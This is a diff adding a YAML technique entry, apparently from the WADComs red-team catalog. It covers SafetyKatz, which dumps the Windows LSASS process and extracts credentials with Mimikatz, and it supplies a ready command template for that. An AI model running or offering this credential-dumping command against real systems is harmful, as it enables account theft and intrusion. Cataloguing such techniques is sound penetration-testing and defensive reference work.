@@ -1,0 +1,30 @@
+id: wadcoms/safetykatz
+type: technique
+platform: active-directory
+name: SafetyKatz
+phases:
+- privilege-escalation
+- discovery
+capabilities:
+- privilege-escalation
+- discovery
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- shell
+commands:
+- template: safetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit"
+  comment: 'SafetyKatz.exe is part of the GhostPack suite of tools and is a combination of SharpDump and
+    Mimikatz. The following command will dump the LSASS process and run Mimikatz to extract credentials
+    from the dumped process. Safetykatz also supports a number of mimikatz native commands '
+references:
+- https://github.com/GhostPack/SafetyKatz
+- https://www.harmj0y.net/blog/redteaming/ghostpack/
+tags:
+- active-directory
+- wadcoms
